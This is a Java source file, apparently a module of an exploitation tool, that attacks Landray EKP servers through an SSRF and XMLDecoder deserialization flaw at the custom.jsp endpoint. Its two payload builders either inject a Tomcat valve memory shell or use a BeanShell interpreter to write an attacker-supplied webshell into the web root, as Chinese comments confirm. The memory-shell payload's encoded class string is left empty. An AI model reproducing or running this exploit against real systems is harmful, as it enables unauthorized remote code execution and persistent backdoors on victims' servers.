package com.droplab.Controller.BlueEkp.Service;

import com.droplab.Utils.CommonUtils;
import com.droplab.Utils.HttpUtils;
import com.droplab.Utils.InfoUtils;
import com.droplab.service.BugService;
import org.jsoup.Connection;
import sun.misc.BASE64Decoder;
import sun.misc.BASE64Encoder;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.Iterator;

public class BlueEkpSSRFXMLDecode extends BugService {
    private final String contentPath="/sys/ui/extend/varkind/custom.jsp";

    @Override
    public boolean check() {
        return false;
    }


    public Object run(String flag){
        try {
            if (!params.isEmpty()) {
                String url="";
                String filepath="";
                String type="";
                Iterator<String> iterator = params.keySet().iterator();
                while (iterator.hasNext()){
                    String key=iterator.next();
                    if(key.equals("url")){
                        url= params.get(key);
                    }
                    if(key.equals("filepath")){
                        filepath=params.get(key);
                    }
                    if(key.equals("type")){  //注入内存马还是落地一个webshell
                        type=params.get(key);
                    }
                }
                if (!url.equals("") && !type.equals("")) {
                    HashMap<String, String> headers = new HashMap<>();
                    CommonUtils.hashMapClone(InfoUtils.headers, headers);
                    headers.put("Referer", url);
                    headers.put("Accept","text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8");

                    HashMap paramMap = new HashMap<>();
                    paramMap.put("var","{\"body\":{\"file\":\"/sys/search/sys_search_main/sysSearchMain.do?method=editParam\"}}");
                    paramMap.put("fdParemNames","111");
                    if(type.equals("file")){
                        paramMap.put("fdParameters", getFilePayload(new File(filepath)));
                    }else if(type.equals("memory")) {
                        paramMap.put("fdParameters", getMemoryPayload());
                    }
                    Connection.Response response = HttpUtils.post(headers, url+contentPath, paramMap);
                    if(flag.equals("exploit")){
                        return response;
                    }
                }
            }
            return null;
        }catch (Exception e){
            return null;
        }
    }


    /*
    XMLDecode反序列化打入valve内存马的payload
     */
    private String getMemoryPayload(){
        String payload="<java>\n" +
                "<void class=\"sun.misc.BASE64Decoder\">\n" +
                "<void method=\"decodeBuffer\" id=\"decodeStr\">\n" +
                "<string></string>\n" +
                "</void>\n" +
                "</void> <void class=\"org.mozilla.javascript.DefiningClassLoader\">\n" +
                "<void method=\"defineClass\">\n" +
                "<string>addValve</string>\n" +
                "<object idref=\"decodeStr\"/>\n" +
                "<void method=\"newInstance\"></void> </void>" +
                "</void>" +
                "</java>";
        return payload;
    }

    /*
        XMLdecode + bsh命令执行写入一个webshell，有文件落地
     */
    private String getFilePayload(File file){
        String PrintWriteStr = "PrintWriter bsh = new PrintWriter(Thread.currentThread().getContextClassLoader().loadClass(\"bsh.Interpreter\").getProtectionDomain().getCodeSource().getLocation().getPath().split(\"WEB-INF\")[0] + \"sms_logins_hr.jsp\");bsh.write(\"%s\");bsh.close();";
        String xmlPayload="<java>\n" +
                "<void class=\"java.lang.String\">\n" +
                "  <array class=\"byte\" length=\"%s\">%s</array>\n" +
                " <void method=\"trim\" id=\"str\">\n" +
                " </void>\n" +
                "</void>\n" +
                "<void class=\"bsh.Interpreter\">\n" +
                "<void method=\"eval\">\n" +
                "<object idref=\"str\"/>\n" +
                "</void>\n" +
                "</void>\n" +
                "</java>";
        if(file.exists()){
            try {
                String payload = String.format(PrintWriteStr,new String(Files.readAllBytes(file.toPath())));
                String encode = new BASE64Encoder().encode(payload.getBytes(StandardCharsets.UTF_8));
                byte[] pbytes = new BASE64Decoder().decodeBuffer(encode);
                /**
                 *   <void index="238"><byte>41</byte></void>
                 *   <void index="239">
                 *    <byte>59</byte>
                 *   </void>
                 */
                String t="<void index=\"%s\"><byte>%s</byte></void>";
                StringBuilder xml= new StringBuilder();
                for (int i=0;i<pbytes.length;i++){
                    xml.append(String.format(t, i, pbytes[i]));
                }
                payload=String.format(xmlPayload,pbytes.length, xml);
                return payload;
            } catch (IOException e) {
                e.printStackTrace();
                return null;
            }

        }else {
            return null;
        }
    }
}
